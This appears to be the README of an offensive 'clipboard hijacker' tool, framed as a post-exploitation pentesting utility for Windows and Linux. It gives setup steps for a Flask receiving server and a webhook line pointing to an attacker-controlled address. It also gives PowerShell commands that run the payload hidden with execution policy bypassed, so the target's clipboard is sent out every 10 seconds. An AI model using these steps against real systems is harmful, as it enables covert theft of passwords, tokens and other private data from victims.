Clipboard Hijacker Tool

Overview

This tool is designed for post-exploitation purposes in pentesting scenarios. It monitors and captures clipboard content on Windows and Linux systems, sending the collected data to an attacker-controlled server via HTTP POST requests.

The tool consists of:

win-payload.ps1 for Windows

linux-payload.ps1 for Linux


Both scripts require manual configuration of the server IP address generated by server.py before execution.


---

How It Works

1. Run server.py:
The Python server listens for clipboard data sent from the target systems.


2. Configure IP Address:
Replace the server IP address in the first line of win-payload.ps1 and linux-payload.ps1 with the IP generated by server.py.


3. Execute the Payload:
Run the PowerShell script on the target system to start capturing and sending clipboard data every 10 seconds.

Setting Up the Server

1. Install Flask if not already installed:

python3 -m pip install flask


2. Run the server:

python3 server.py


3. The server will display an IP address (e.g., http://10.0.0.5:5000). Use this IP to replace the placeholder in both payload files.

Manual IP Configuration

Open the payload file (win-payload.ps1 or linux-payload.ps1) in a text editor.
Update the first line with the correct server IP:

$webhook_url = "http://<Your_Server_IP>:5000/clipboard_receiver"

Replace <Your_Server_IP> with the actual IP displayed when running server.py.

Execution Commands

Windows Execution

Run the win-payload.ps1 script on the target machine:

powershell -NoP -NonI -W Hidden -Exec Bypass .\win-payload.ps1


---

Linux Execution

Run the linux-payload.ps1 script using PowerShell on Linux:

pwsh -NoProfile -NonInteractive -ExecutionPolicy Bypass -File ./linux-payload.ps1
